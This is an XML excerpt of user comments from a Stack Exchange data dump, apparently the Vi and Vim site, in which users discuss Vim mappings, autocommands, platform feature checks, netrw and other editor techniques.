  <row Id="2486" PostId="2545" Score="0" Text="No, this is not a duplicate. I want vi to start in insert mode ONLY FOR THE THREE SCENARIOS I HAVE MENTIONED." CreationDate="2015-03-13T23:23:04.043" UserId="368" />
  <row Id="2487" PostId="2545" Score="3" Text="OKAY, I'M SORRY BUT IT REALLY LOOKED LIKE A DUPLICATE. ;-) I've edited your question a bit to make the differences clearer." CreationDate="2015-03-13T23:47:37.527" UserId="51" />
  <row Id="2488" PostId="2545" Score="0" Text="Related: https://vi.stackexchange.com/questions/239/how-do-i-make-vim-use-a-default-filename-when-not-given-any-filenames, https://vi.stackexchange.com/questions/258/how-do-i-run-a-command-on-creation-of-a-new-file" CreationDate="2015-03-14T00:13:36.970" UserId="205" />
  <row Id="2489" PostId="2543" Score="1" Text="In a way, `dd` is identical to `d_`. `_` brings the cursor to the first non-blank on the (`[count]`-1)th line down, but it's linewise, so when paired with an operator, it operates on entire lines. For that reason, it makes sense that a count can appear between the two `d`s." CreationDate="2015-03-14T00:40:52.547" UserId="64" />
  <row Id="2490" PostId="2544" Score="0" Text="It does work. It's really the output generated and the prompt." CreationDate="2015-03-14T01:17:09.977" UserId="812" />
  <row Id="2492" PostId="2531" Score="1" Text="BTW it turns out using `gk` as characterwise apparently requires `:set wrap` (somewhat cryptically).  I couldn't figure out why this seemingly was working for everyone else but not for me, when the help for `gk` likewise seemed to imply it should work.  The only clue was that the main meaning of `gk` had to do with wrapped lines.  Once I tried setting wrap on (kind of on a whim), voila, it worked." CreationDate="2015-03-14T02:08:17.147" UserId="1344" />
  <row Id="2493" PostId="2546" Score="0" Text="Great answer! Upvoted. I did link to my use case (also on vi.SE) at the start of the question, but I guess you must have missed it. I basically need to do `:omap d d` (!), but unfortunately operator-pending mode is never actually reached because of my mapping for d that sets the custom operator function. Hopefully it's possible to tweak things to make `d3d` work how it should, though. (Let me know if you have any ideas, or feel free to post a complete solution to the other question if you prefer.) If I can't figure it out soon, I'll accept this and post another, more specific question. Thanks!" CreationDate="2015-03-14T08:22:58.877" UserId="343" />
  <row Id="2494" PostId="2547" Score="0" Text="`iab &lt;buffer&gt; E...`?" CreationDate="2015-03-14T08:42:08.847" UserId="205" />
  <row Id="2495" PostId="2546" Score="0" Text="Actually, on second thoughts, I'm accepting this now. You explained both how to create such a mapping, and also how it works under the hood, which were the two things I asked." CreationDate="2015-03-14T08:51:07.763" UserId="343" />
  <row Id="2496" PostId="2547" Score="0" Text="@muru That doesn't work from a modeline." CreationDate="2015-03-14T09:08:03.390" UserId="267" />
  <row Id="2497" PostId="2545" Score="0" Text="Well, @muru, the first link is irrelevant to my question, and the second link's answers show how to run a Unix command when a file is created, but I need to run a vim command ('i'), and need to run it in the other two cases as well." CreationDate="2015-03-14T09:12:52.967" UserId="368" />
  <row Id="2499" PostId="2549" Score="5" Text="OP mentions that he's already tried this in his question. If you're posting this because it's definitely the only possible solution, you should probably say so explicitly." CreationDate="2015-03-14T09:25:16.943" UserId="343" />
  <row Id="2500" PostId="2545" Score="2" Text="@JohnSonderson the first link tells you how to find if no filename is given, the second can be adapted by using `normal` instead of `exec`." CreationDate="2015-03-14T09:42:40.943" UserId="205" />
  <row Id="2501" PostId="2547" Score="0" Text="This specific scenario is calling for `\newcommand{\EI}{Elçilerin İşleri}`" CreationDate="2015-03-14T12:04:19.247" UserId="8" />
  <row Id="2502" PostId="2547" Score="0" Text="@Gilles I actually started out with that, but it has a couple drawbacks. One is that it makes post-processing harder. There are a couple of scripts that keep track of what gets referenced where (that checks an API to validate the references) and doing this against the TeX source is a lot easier that having to compile it and run against the formatted output." CreationDate="2015-03-14T12:36:32.577" UserId="267" />
  <row Id="2503" PostId="2550" Score="0" Text="How about the autocmd for WinEnter? When the last window that isn't yours is exited, you should get a winEnter on your window, and can check that yours is the only window and then quit." CreationDate="2015-03-14T12:56:04.497" UserId="227" />
  <row Id="2504" PostId="2555" Score="1" Text="Wow, these are some great mappings and settings. Thank you for the detailed answer." CreationDate="2015-03-14T18:04:58.377" UserId="489" />
  <row Id="2505" PostId="2545" Score="0" Text="Please see my updated post, still not sure if there's a way to do what I'm looking for." CreationDate="2015-03-14T21:54:16.473" UserId="368" />
  <row Id="2506" PostId="2561" Score="0" Text="Wonderful! I think, it works only the client side terminal supports it, but it can work!" CreationDate="2015-03-15T05:30:19.627" UserId="28" />
  <row Id="2508" PostId="2553" Score="0" Text="`iskeyword=@,48-57,_,192-255,-,#,.&#xA;        Last set from ~/dotfiles/vim/plugged/vim-coloresque/after/syntax/css/vim-coloresque.vim`" CreationDate="2015-03-15T06:02:48.213" UserId="237" />
  <row Id="2510" PostId="2553" Score="0" Text="You know what, it is working in a new text file. Just not in the `.html.slim` template" CreationDate="2015-03-15T06:04:41.953" UserId="237" />
  <row Id="2512" PostId="2553" Score="0" Text="Yep, that was right from `.html.slim`. Here is the output from a new file: `iskeyword=@,48-57,_,192-255&#xA;        Last set from ~/.vimrc`" CreationDate="2015-03-15T06:07:56.313" UserId="237" />
  <row Id="2513" PostId="2560" Score="4" Text="So what's your question exactly? You followed some instructions somewhere (where? what exactly did you do?) and something doesn't work (what?) as you're expecting (what did you expect?)" CreationDate="2015-03-15T06:08:44.237" UserId="51" />
  <row Id="2514" PostId="2553" Score="0" Text="Here it is in `vim-coloresque`: https://github.com/gorodinskiy/vim-coloresque/blob/master/after/syntax/css/vim-coloresque.vim#125-127" CreationDate="2015-03-15T06:09:28.373" UserId="237" />
  <row Id="2516" PostId="2563" Score="0" Text="Dammit I forgot to mention that I'd like it for insert mode too. I suppose that can be handled by an `imap` with `&lt;ESC&gt;` prepended and `a` appended?" CreationDate="2015-03-15T06:29:11.287" UserId="205" />
  <row Id="2518" PostId="2563" Score="0" Text="@muru I would say that using `&lt;Down&gt;` and `&lt;End&gt;` is easier ;-) See updated answer." CreationDate="2015-03-15T06:32:51.677" UserId="51" />
  <row Id="2519" PostId="2563" Score="0" Text="(mumble mumble) tunnel vision (mumble mumble). :D" CreationDate="2015-03-15T06:34:47.637" UserId="205" />
  <row Id="2520" PostId="2545" Score="1" Text="The vimrc file is read *only once*: when Vim starts. The contents of autocmd is run every time it's triggered. So the `if` statement should not be *around* the autocmd, if should be *inside* the autocmd, so it will be run every time the autocmd is triggered." CreationDate="2015-03-15T06:42:54.147" UserId="51" />
  <row Id="2521" PostId="2544" Score="1" Text="As, so you mean &quot;Vim freezes while the tests are running&quot;? And not &quot;Vim freezes indefinitely and I need to kill it&quot;?" CreationDate="2015-03-15T06:54:50.043" UserId="51" />
  <row Id="2522" PostId="839" Score="0" Text="Very related question: http://vi.stackexchange.com/questions/2135/can-i-add-an-end-of-line-string-when-vim-wraps-a-line-due-to-textwidth ..." CreationDate="2015-03-15T06:58:49.750" UserId="51" />
  <row Id="2523" PostId="2563" Score="1" Text="Whitespace is totally valid in the right-hand-side of an `&lt;expr&gt;` mapping. You might be thinking of `:set`?" CreationDate="2015-03-15T11:52:24.310" UserId="64" />
  <row Id="2524" PostId="839" Score="0" Text="In fact, I think it's a dup :)" CreationDate="2015-03-15T12:21:19.480" UserId="91" />
  <row Id="2525" PostId="2563" Score="0" Text="@tommcdo Yeah, I had it mixed up :-/" CreationDate="2015-03-15T15:22:26.807" UserId="51" />
  <row Id="2526" PostId="2544" Score="0" Text="As soon as I press `C`, Vim goes to the terminal view and there is no output. I will add the part of the script which has the prompt" CreationDate="2015-03-15T17:14:04.587" UserId="812" />
  <row Id="2527" PostId="2514" Score="1" Text="This behavior has been reported at https://github.com/neovim/neovim/issues/1551 as a bug." CreationDate="2015-03-15T18:42:47.567" UserId="300" />
  <row Id="2529" PostId="2531" Score="0" Text="@BobH You're right. Odd. That's a very poorly worded bit of help text." CreationDate="2015-03-15T20:42:56.847" UserId="343" />
  <row Id="2530" PostId="2478" Score="0" Text="I see, [that is useful](http://vimcasts.org/episodes/operating-on-search-matches-using-gn/). I had better upgrade to Vim 7.4!" CreationDate="2015-03-15T21:07:31.457" UserId="630" />
  <row Id="2531" PostId="2573" Score="0" Text="I was going to suggest this too, but found out that this does not work for me. Maybe a Vim bug? It just opens a larger horizontal split for me." CreationDate="2015-03-16T08:40:09.133" UserId="246" />
  <row Id="2532" PostId="2573" Score="0" Text="@Akshay Works for me in Vim 7.3." CreationDate="2015-03-16T08:42:18.983" UserId="24" />
  <row Id="2533" PostId="2573" Score="0" Text="@200_success works for me too, thank you!" CreationDate="2015-03-16T08:42:36.400" UserId="1317" />
  <row Id="2534" PostId="2573" Score="0" Text="Oh, seems to work if I do `vim -Nu NONE`. Nevermind ;). EDIT: Ah it was because I always set the quickfix window to open at the bottom with `wincmd J`" CreationDate="2015-03-16T08:46:39.363" UserId="246" />
  <row Id="2535" PostId="2572" Score="0" Text="Could you provide some specific examples of OS-dependent behaviours that you seek to implement?" CreationDate="2015-03-16T08:47:55.587" UserId="24" />
  <row Id="2536" PostId="2572" Score="0" Text="@200_success I have some scripts and key bindings for [MS TFS](https://en.wikipedia.org/wiki/Team_Foundation_Server) and msbuild that are pretty useless in non-Windows environments, while I don't need [tmux](http://tmux.sourceforge.net/) support in gVim on Windows. In addition, there are different fonts installed on different systems, and paths may differ as well." CreationDate="2015-03-16T08:52:48.367" UserId="1317" />
  <row Id="2537" PostId="389" Score="1" Text="I had the reverse. YCM worked fine (even if it was a PITA to install) but clang-complete never worked..." CreationDate="2015-03-16T09:12:44.790" UserId="622" />
  <row Id="2539" PostId="2542" Score="0" Text="just a silly question - how do you manage to copy the statusline ? I would like to ask another question about airline." CreationDate="2015-03-16T09:42:39.577" UserId="1382" />
  <row Id="2540" PostId="2574" Score="1" Text="Very important to note [romainl's answer](http://vi.stackexchange.com/a/2577/343) if you want it to work on OS X, though." CreationDate="2015-03-16T10:33:05.560" UserId="343" />
  <row Id="2541" PostId="2577" Score="0" Text="Well, OSX is a UNIX system, I believe it's even &quot;certified UNIX&quot;. So `has('unix')` is accurate. It's odd that `has('macunix')` is false, though. This almost sounds like a bug?" CreationDate="2015-03-16T10:48:37.793" UserId="51" />
  <row Id="2542" PostId="2577" Score="0" Text="I did some checking, and `has('macunix')` seems to depend on `MACOS_X_UNIX`, which is set if `uname` is `Darwin` in the `configure` script..." CreationDate="2015-03-16T10:56:48.173" UserId="51" />
  <row Id="2543" PostId="2581" Score="0" Text="That doesn't address what the OP is asking, though." CreationDate="2015-03-16T13:37:05.070" UserId="15" />
  <row Id="2544" PostId="2581" Score="0" Text="@jamessan re-read the question and still don't get - so, the goal is to delete all lines containing unique words?" CreationDate="2015-03-16T13:38:23.443" UserId="1302" />
  <row Id="2545" PostId="2581" Score="1" Text="The goal is to delete a line if that is the only line in the file containing a certain word." CreationDate="2015-03-16T13:39:27.803" UserId="15" />
  <row Id="2546" PostId="2580" Score="0" Text="Have you tried anything so far? By showing your attempts and describing what parts you are having difficulty with, we get a better understanding of your proficiency and can give a more precise answer. As it stands, it just looks like you've posted a requirement and want someone to write your code for you." CreationDate="2015-03-16T13:40:49.037" UserId="970" />
  <row Id="2547" PostId="2581" Score="0" Text="@jamessan I'm not arguing, I'm just trying to understand the question better to asnwer it neverthelees. &quot;The only line in file containing a certain word&quot; - but it looks like :g/&lt;pattern&gt;/d  falls under this definition" CreationDate="2015-03-16T13:41:36.210" UserId="1302" />
  <row Id="2548" PostId="2581" Score="1" Text="The OP doesn't know what words need to be deleted.  So the goal is to have a way to run a command which will determine which of a set of words only appear in one line and then delete those lines.  `:g/{pattern}/d` only solves the second part of the problem, not the first." CreationDate="2015-03-16T13:43:54.310" UserId="15" />
  <row Id="2549" PostId="2581" Score="0" Text="@jamessan in that case the definition of unique word should be clarified by OP, because, for instance, any line with number occured once (&quot;3 downto 0&quot; in the example whould be deleted as well" CreationDate="2015-03-16T13:46:33.680" UserId="1302" />
  <row Id="2550" PostId="2580" Score="0" Text="Can you please clarify, so, the goal is to delete all lines containing unique words? Without knowing beforehandedly what are these unique words?" CreationDate="2015-03-16T13:47:25.863" UserId="1302" />
  <row Id="2551" PostId="2580" Score="0" Text="@shabunc, yes, that is the situation." CreationDate="2015-03-16T13:51:02.557" UserId="356" />
  <row Id="2552" PostId="2580" Score="0" Text="@IngoKarkat I haven't. I normally would (I know how SE works ;) ) but in this case I have no feeling at all on how I could achieve this. The only thing that occurs to me is searching and counting. But since I don't know the words I want to search beforehand I really don't know where to start..." CreationDate="2015-03-16T13:59:01.510" UserId="356" />
  <row Id="2553" PostId="2580" Score="0" Text="Do you require a single command that carries out the entire process? Or are you just looking to get the job done?" CreationDate="2015-03-16T14:02:02.967" UserId="343" />
  <row Id="2554" PostId="2580" Score="0" Text="@Rich, a single command would be preferred. But multiple commands are also welcome." CreationDate="2015-03-16T14:03:36.873" UserId="356" />
  <row Id="2556" PostId="2542" Score="0" Text="I just shift-highlighted and copied from tmux." CreationDate="2015-03-16T14:09:52.763" UserId="1336" />
  <row Id="2557" PostId="2580" Score="0" Text="@Rich, I think &quot;delete all lines which contain any unique words&quot; is the right question to think about. So that the answer can be useful in other situations. But for more general cases it could be useful to put restrictions like &quot;if the unique word is a number do not delete the line&quot;." CreationDate="2015-03-16T14:19:23.393" UserId="356" />
  <row Id="2558" PostId="2580" Score="0" Text="I think the mistake that I (and shabunc, below) was making is that we thought that *all* the lines in the file conformed to the format described in your code sample, whereas now I'm guessing that the *rest* of the file is completely different?" CreationDate="2015-03-16T14:21:18.760" UserId="343" />
  <row Id="2559" PostId="2577" Score="0" Text="Oddly enough, `has (&quot;win32&quot;)` seems to work for me even in 64-bit Vim." CreationDate="2015-03-16T14:29:30.460" UserId="343" />
  <row Id="2560" PostId="2580" Score="0" Text="@Rich yes, the rest of the file is completely different. I edited my question to provide an example file. Thank you for your edit, btw." CreationDate="2015-03-16T14:36:58.773" UserId="356" />
  <row Id="2561" PostId="2582" Score="0" Text="So what are you looking for? Using `''` or `&lt;C-o&gt;` is sort of the answer :-) Do you want it to happen automatically?" CreationDate="2015-03-16T14:53:58.930" UserId="51" />
  <row Id="2562" PostId="2580" Score="0" Text="Is there a reason this must be done in vim commands rather than, say, an external script that could be run on the file? It feels like the problem might be easier to approach from the outside." CreationDate="2015-03-16T14:56:05.813" UserId="1166" />
  <row Id="2563" PostId="2582" Score="0" Text="Automatically would be great; I'm hoping to eliminate an extra couple of keys, since I find myself going find-replace a lot, oh and learn something new (_:" CreationDate="2015-03-16T15:06:43.183" UserId="1389" />
  <row Id="2564" PostId="2580" Score="1" Text="@SnoringFrog, I have two reasons: 1) achieving OS independence for the task (on Linux a script for this would be easy, but not on Windows, I think); 2) exploring the limits of Vim." CreationDate="2015-03-16T15:34:09.663" UserId="356" />
  <row Id="2567" PostId="2577" Score="0" Text="@Rich Yes, and that's documented as such. This is really the sane thing to do, do you care if your app is 32 or 64 bits? I don't. The reason it's called 'win32', is because that's the name Microsoft choose for their Windows NT API. [Naming things isn't Microsoft's strong point](http://stackoverflow.com/q/4039054/660921)." CreationDate="2015-03-16T16:55:43.820" UserId="51" />
  <row Id="2568" PostId="2577" Score="0" Text="@Carpetsmoker I agree it makes sense from pragmatism. If the documentation is using Win32 to mean &quot;Windows API&quot;, though, what does it (and romainl) mean when it refers to &quot;Win64&quot;?" CreationDate="2015-03-16T17:26:48.490" UserId="343" />
  <row Id="2569" PostId="2577" Score="0" Text="@Rich This is also in the documentation: *&quot;Win64 version of Vim (MS-Windows 64 bit).&quot;*..." CreationDate="2015-03-16T17:41:03.027" UserId="51" />
  <row Id="2570" PostId="2583" Score="0" Text="Is there a way to &quot;enable&quot; `KeepView` for all find-replace operations? I'm trying to minimize typing (_:" CreationDate="2015-03-16T17:57:27.003" UserId="1389" />
  <row Id="2571" PostId="2577" Score="0" Text="@Carpetsmoker I'm looking at the documentation. What I can't figure out is how you're interpreting it. To me, it's saying that win32 will be set on 32-bit Vim (regardless of what version of Windows it's running under), and that win64 will be set in 64-bit Vim. You're saying it means something different, but I can't figure out what." CreationDate="2015-03-16T18:06:56.490" UserId="343" />
  <row Id="2572" PostId="2542" Score="0" Text="Thanks for the trick, it works with vim, but not with gvim, any idea ?" CreationDate="2015-03-16T18:17:34.787" UserId="1382" />
  <row Id="2573" PostId="2582" Score="0" Text="@Carpetsmoker as well as `` ) Actually it looks like this particular question boils down to the issue whether it is possible to find some autocmd event we can listen to and trigger this automatically." CreationDate="2015-03-16T18:53:25.813" UserId="1302" />
  <row Id="2574" PostId="2583" Score="1" Text="You can create a shorter `:KV` alias command, or even `:kv` using cmdalias.vim. To be even more extreme: `:nnoremap : :KeepView&lt;Space&gt;`" CreationDate="2015-03-16T19:59:50.123" UserId="970" />
  <row Id="2575" PostId="96" Score="2" Text="ssh -Y implies -X so -X can be omitted." CreationDate="2015-03-16T20:52:44.290" UserId="395" />
  <row Id="2576" PostId="2588" Score="0" Text="Perfect. This question doesn't require escaping inside of the variable but, just for completeness, how would one do that? Just use `split` on the variable and concatenate it back together into a new variable with escape characters where they are required?" CreationDate="2015-03-16T22:05:17.263" UserId="1154" />
  <row Id="2577" PostId="2558" Score="0" Text="This answer has the slight problem that if you do &lt;kbd&gt;Ctrl+o&lt;/kdb&gt; in the &quot;help&quot; window and then attempt to switch back to the regular hidden buffer (with, e.g. `:b1`), Vim closes. Switching the variable to be buffer local fixes this problem, though. (Which makes sense. Although I stated that I want the window to be transient, it's really *any* window that currently contains the *buffer* that I want to behave differently.)" CreationDate="2015-03-16T22:19:58.877" UserId="343" />
  <row Id="2578" PostId="2220" Score="2" Text="Bump! If you check the Gundo issue, someone has posted a fork that provides a searching feature." CreationDate="2015-03-16T22:25:32.170" UserId="630" />
  <row Id="2579" PostId="2564" Score="0" Text="What do you mean &quot;actionable&quot;? Or more specifically, what actions can I take, and how?" CreationDate="2015-03-16T23:05:38.850" UserId="630" />
  <row Id="2581" PostId="2588" Score="2" Text="The easiest way would be to use the `\V` or very non-magic along with the `escape()` function. e.g. `let regex = '\V\^The \(' . join(map(keys(myDict), 'escape(v:val, '''\''')'), '\|') . '\)'`" CreationDate="2015-03-16T23:11:32.707" UserId="778" />
  <row Id="2583" PostId="2560" Score="0" Text="Part of the process Aaron didn't mention is actually generating the tags file.  That might be possible by running something on the shell: `jsctags *.js **/*.js`" CreationDate="2015-03-17T00:18:04.520" UserId="630" />
  <row Id="2585" PostId="2564" Score="0" Text="I suppose typing `:[line_number]` is the obvious action. I can also yank the last line with `/y` or delete all of them with `/d`. (I just stumbled across the holy grail.) Is there any way to yank all the lines?" CreationDate="2015-03-17T00:30:31.757" UserId="630" />
  <row Id="2586" PostId="2592" Score="1" Text="Thanks, this command worked ... `:34908,34914w ~/webservicelogextract.txt`" CreationDate="2015-03-17T01:58:38.767" UserId="398" />
  <row Id="2587" PostId="2220" Score="0" Text="@joeytwiddle I saw that! Haven't checked it out yet, though." CreationDate="2015-03-17T02:27:43.810" UserId="1060" />
  <row Id="2588" PostId="2593" Score="0" Text="I may not have been clear enough - I'm fine with how the status line looks with regard to current match highlighting. What I want is for the items in the list appearing above the status line (when `set wildmode=list` is set) to be highlighted as well." CreationDate="2015-03-17T02:32:29.533" UserId="489" />
  <row Id="2589" PostId="1909" Score="0" Text="The bolding makes the `zw` look like capitals." CreationDate="2015-03-17T04:10:49.070" UserId="205" />
  <row Id="2590" PostId="2589" Score="0" Text="This is an excellent trick" CreationDate="2015-03-17T06:23:24.650" UserId="489" />
  <row Id="2591" PostId="2564" Score="0" Text="@joeytwiddle, yes, `:23&lt;CR&gt;` is the obvious one. You can use `:g//y A` to yank all the lines in the output to register `a`." CreationDate="2015-03-17T06:44:15.163" UserId="54" />
  <row Id="2592" PostId="2596" Score="1" Text="There is no 'pretty' name, but you can use `:command` to get a list of user-defined commands (this includes commands from plugins). You can also use `:nmap` to get a list of user-defined keybinds, `:function` for user-defined functions, and so forth..." CreationDate="2015-03-17T10:24:59.387" UserId="51" />
  <row Id="2593" PostId="2593" Score="2" Text="@broma0 I edited your answer to make it a bit clearer what you're asking for. (The &quot;status line&quot; you're referring to *is* the wildmenu.)" CreationDate="2015-03-17T10:29:03.577" UserId="343" />
  <row Id="2595" PostId="2592" Score="1" Text="Note that most (all?) commands that take a range also work from Visual mode. When you type `:` from Visual mode, it automatically inserts `'&lt;,'&gt;` for you. This is a range using special marks that refer to the start and end of a Visual selection. Leave the inserted range and type in your command (it will look like `:'&lt;,'&gt;w webservicelogextract.txt`)." CreationDate="2015-03-17T11:17:38.043" UserId="64" />
  <row Id="2596" PostId="2580" Score="0" Text="In your sample file, a completely generic solution might also delete the last line, which contains a unique `3`. I bring this up because I feel the problem is too delicate for a general solution." CreationDate="2015-03-17T11:30:46.860" UserId="64" />
  <row Id="2597" PostId="2593" Score="0" Text="@broma0 I don't think the highlighting for that can be changed without affecting other colors." CreationDate="2015-03-17T12:03:55.057" UserId="865" />
  <row Id="2598" PostId="2580" Score="0" Text="Typically simulators provide a linting option that reports unused declared signals. What I do is to copy that list to the file and then record a macro that searches the signal under the cursor, deletes the line, searches again and deletes line again (the original one where we started). I then just repeat the macro the required number of times." CreationDate="2015-03-17T12:19:30.090" UserId="599" />
  <row Id="2599" PostId="2598" Score="0" Text="This would require defining your own option for `set` ;  AFAIK, this is not possible in Vim ..." CreationDate="2015-03-17T12:31:06.347" UserId="51" />
  <row Id="2600" PostId="2598" Score="0" Text="@Carpetsmoker Does that mean the answer to this question is that vimscript cannot wrapper or otherwise extend built-in functions?" CreationDate="2015-03-17T12:36:41.873" UserId="267" />
  <row Id="2601" PostId="2594" Score="0" Text="If you're talking about buffers, rather than Vim-tabs, you could try http://fholgado.com/minibufexpl, which provides more of a tabby sort of experience than the answers currently given. It will resize itself to be as many rows as necessary to fit in all the buffer names." CreationDate="2015-03-17T13:43:59.650" UserId="343" />
  <row Id="2602" PostId="2586" Score="0" Text="+1 and thanks, it works; but it has a problem: if I repeat the change after the first one with `.` the &quot;going back&quot; is not repeated. I am accepting the answer because I really did not specify that thing..." CreationDate="2015-03-17T13:50:52.163" UserId="854" />
  <row Id="2603" PostId="2599" Score="4" Text="Upvoted for option 3. I think this is the most semantically appropriate and Vim-suitable approach." CreationDate="2015-03-17T14:49:45.840" UserId="64" />
  <row Id="2604" PostId="1909" Score="0" Text="@muru edited..." CreationDate="2015-03-17T15:05:18.440" UserId="390" />
  <row Id="2605" PostId="2596" Score="1" Text="You could possibly make a unite source that shows this information, possibly by making a menu. This could be generated with manual and/or automatic techniques. Unite ships with a 'command' source, but this would not include descriptions." CreationDate="2015-03-17T16:53:54.980" UserId="680" />
  <row Id="2606" PostId="2601" Score="0" Text="[`:help netrw-cr`](http://vimdoc.sourceforge.net/htmldoc/pi_netrw.html#netrw-cr) does not document any use of the count. Most attempts I have made result in `Invalid range: call s:UseBufWinVars()`" CreationDate="2015-03-17T17:22:48.630" UserId="880" />
  <row Id="2607" PostId="2604" Score="0" Text="Thanks, but what does &quot;netrw-cr&quot; mean? And what does &quot;netrw&quot; stand for?" CreationDate="2015-03-17T19:00:14.887" UserId="1080" />
  <row Id="2608" PostId="2604" Score="1" Text="netrw is the plugin that handles directory browsing with Explore, its help topics have a prefix of `netrw-`, and cr refers to the carriage return key (enter). It's called netrw because it also handles reading and writing files over a network." CreationDate="2015-03-17T19:01:14.353" UserId="880" />
  <row Id="2609" PostId="2586" Score="1" Text="You need to use the [repeat.vim](http://www.vim.org/scripts/script.php?script_id=2136) plugin to make repeat work. Unfortunately, that requires some more boilerplate code, like `&lt;Plug&gt;` mappings." CreationDate="2015-03-17T19:01:47.257" UserId="970" />
  <row Id="2611" PostId="2596" Score="0" Text="That's exactly what my answer in my &quot;possible duplicate&quot; link describes :)" CreationDate="2015-03-17T23:08:07.547" UserId="64" />
  <row Id="2612" PostId="2602" Score="1" Text="When using _the same_ macro often (without using other macros inbetween), it's very convenient to use `@@` from the 2nd time on." CreationDate="2015-03-17T23:50:04.703" UserId="1416" />
  <row Id="2613" PostId="2608" Score="1" Text="Nice :) `:args */.git/config` actually populates the buffer list as well, so `:bnext` works too. Does that seem odd? (Vim 7.4.52, and Neovim)" CreationDate="2015-03-18T04:00:45.640" UserId="578" />
  <row Id="2614" PostId="2608" Score="1" Text="Also a reminder to others, `]a` cycles the `:args` list if https://github.com/tpope/vim-unimpaired is installed." CreationDate="2015-03-18T04:01:45.637" UserId="578" />
  <row Id="2615" PostId="2612" Score="0" Text="Could you explain that semicolon? I'd have expected a &lt;kbd&gt;.&lt;/kbd&gt; there to denote the current line (which is the line matching ^Chapter), and can't really find out what a semicolon does there (usually, it repeats f,F,t,T, but that doesn't apply here, does it?). Also, couldn't you use `%:h` instead of path/to/dir?" CreationDate="2015-03-18T08:34:36.400" UserId="1296" />
  <row Id="2616" PostId="2612" Score="0" Text="@PhilippFrank: The semicolon is a range delimiter, see `:h :range`. It makes the search for the end start at the position of the first part of the range (with `:g`, it actually doesn't matter, and `,` would do, too). Yes, `%:h` would do; the `path/to/dir` was just an example, obviously." CreationDate="2015-03-18T08:56:52.657" UserId="970" />
  <row Id="2617" PostId="2614" Score="0" Text="I did reproduce this with vim, but the command line did not show `:noh` for me. Doing the same with gvim did not show this behavior." CreationDate="2015-03-18T12:04:17.120" UserId="1296" />
  <row Id="2618" PostId="2607" Score="0" Text="Similar: [How can I open multiple tabs at once?](http://vi.stackexchange.com/q/2108/467) at Vim SE" CreationDate="2015-03-18T12:10:22.313" UserId="467" />
  <row Id="2619" PostId="2607" Score="0" Text="Related: [How do I make vim open all files matching a pattern in different tabs?](http://stackoverflow.com/q/3468763/55075), [Is there a way to open multiple files at once from vim?](http://stackoverflow.com/q/12304520/55075), [How to get vim to open multiple files into tabs at once?](http://superuser.com/q/171763/87805)" CreationDate="2015-03-18T12:14:11.650" UserId="467" />
  <row Id="2620" PostId="2612" Score="0" Text="Do you think you could explain how it works a bit more detail? I've read `:h :global` and `:h :range`, and I understand roughly what's happening, but I'm still having a bit of trouble parsing precisely the boundary between where the &quot;pattern&quot; for the global ends and where the range for the write begins." CreationDate="2015-03-18T12:19:04.827" UserId="343" />
  <row Id="2621" PostId="2608" Score="0" Text="Also `:argadd file*` can do." CreationDate="2015-03-18T12:26:34.617" UserId="467" />
  <row Id="2622" PostId="2612" Score="0" Text="@Rich: Yes, it's a bit cryptic. I've added some more details!" CreationDate="2015-03-18T13:15:22.387" UserId="970" />
  <row Id="2623" PostId="2615" Score="0" Text="Unfortunately, I've had this mapping almost since I started using Vim, so it's pretty well burned in to my muscle memory by now. Thanks for the explanation, though." CreationDate="2015-03-18T14:22:13.193" UserId="343" />
  <row Id="2624" PostId="2612" Score="0" Text="It was the implicit `.` that was stumping me. Thanks!" CreationDate="2015-03-18T14:23:22.283" UserId="343" />
  <row Id="2625" PostId="2614" Score="1" Text="A common mapping for clearing the search highlight is: `nnoremap &lt;c-l&gt; :noh&lt;cr&gt;&lt;c-l&gt;`" CreationDate="2015-03-18T14:43:54.800" UserId="778" />
  <row Id="2626" PostId="2612" Score="0" Text="Thank you very much for this. I am most impressed by your wizardry." CreationDate="2015-03-18T14:49:54.027" UserId="1417" />
  <row Id="2627" PostId="2616" Score="0" Text="This question might be a really good candidate for asking on [vi.se]. You might consider flagging your question for a moderator to migrate there if you want to try your luck getting an answer there instead. I don't think this is possible without a special plugin that might be a pretty involved setup process." CreationDate="2015-03-17T11:18:00.117" UserId="267" />
  <row Id="2628" PostId="2616" Score="0" Text="Wow I never knew that existed! Mixed feelings about migrating from a site with 16k questions on vim and close to a million users to one with 0.5k and c900..." CreationDate="2015-03-17T11:25:13.263" UserId="1406" />
  <row Id="2629" PostId="2616" Score="0" Text="It's a beta site and yes, traffic and user base are a consideration given that this is on topic both places. You might find, however, that people are more willing to go in depth to provide solutions on the dedicated site rather than just brushing this off with a &quot;nope&quot; here and having it quickly get lost in the question stack." CreationDate="2015-03-17T11:30:33.503" UserId="267" />
  <row Id="2630" PostId="2616" Score="0" Text="Yeah, good points. If it's going to happen I'll go with it, but the fragmentation on SE is not always helpful IMO (I regularly use unix/SO/SU/security/DBA and there's a lot of Xover). But I have sympathies for the beta sites - especially as I've been trying to [get a CiviCRM one going](http://area51.stackexchange.com/proposals/77367/civicrm)! Will flag." CreationDate="2015-03-17T11:36:42.507" UserId="1406" />
  <row Id="2631" PostId="2617" Score="3" Text="After further thinking, I've suggested another approach. The files could contain such kind of modeline: `:vim set ft=php.psr2`. And the OP would have to define a ftplugin `ftplugin/psr2.vim` that'll contain calls to `:setlocal`." CreationDate="2015-03-17T13:14:42.180" UserId="626" />
  <row Id="2632" PostId="2610" Score="0" Text="I use `&lt;c-j&gt;` and `&lt;c-k&gt;` when `pumvisble()` to move through the list. I will look in to this, thank you." CreationDate="2015-03-18T14:53:18.527" UserId="489" />
  <row Id="2633" PostId="2615" Score="0" Text="I should probably add, for posterity's sake, the problem described is the *only* problem that I know is definitely caused by this mapping, and the only weird unresolved problem I can recollect having with Vim." CreationDate="2015-03-18T14:53:37.140" UserId="343" />
  <row Id="2635" PostId="2625" Score="0" Text="Yeah I'm aware of this setting, I'm just not a fan of having a huge line in my buffers." CreationDate="2015-03-18T19:50:57.477" UserId="581" />
  <row Id="2636" PostId="2620" Score="1" Text="Well, they're sent whenever the `'term'` option is set.  That's usually only during startup, but there may be scenarios where it is set at runtime." CreationDate="2015-03-18T20:25:52.047" UserId="15" />
  <row Id="2637" PostId="2623" Score="0" Text="What colour scheme is that? It looks quite nice." CreationDate="2015-03-18T20:49:21.007" UserId="5" />
  <row Id="2638" PostId="2623" Score="0" Text="https://github.com/scwood/vim-hybrid" CreationDate="2015-03-18T20:54:30.207" UserId="581" />
  <row Id="2639" PostId="2620" Score="0" Text="In this particular case, this seems to be caused by may_req_ambiguous_char_width() which is only called on startup" CreationDate="2015-03-18T21:48:05.767" UserId="71" />
